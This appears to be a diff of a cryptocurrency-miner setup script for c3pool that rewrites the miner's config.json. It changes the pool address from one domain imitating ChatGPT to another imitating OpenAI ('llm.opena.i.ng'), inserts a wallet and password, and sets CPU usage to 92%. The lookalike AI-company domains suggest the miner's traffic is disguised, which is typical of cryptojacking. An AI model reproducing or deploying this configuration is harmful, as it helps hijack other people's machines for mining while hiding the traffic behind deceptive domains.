@@ -253,7 +253,7 @@ if [ -z $PASS ]; then
 fi
 
 
-sed -i 's/"url": *"[^"]*",/"url": "chatgpt.ai.88877766.xyz:'$PORT'",/' $HOME/c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "llm.opena.i.ng:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 92,/' $HOME/c3pool/config.json
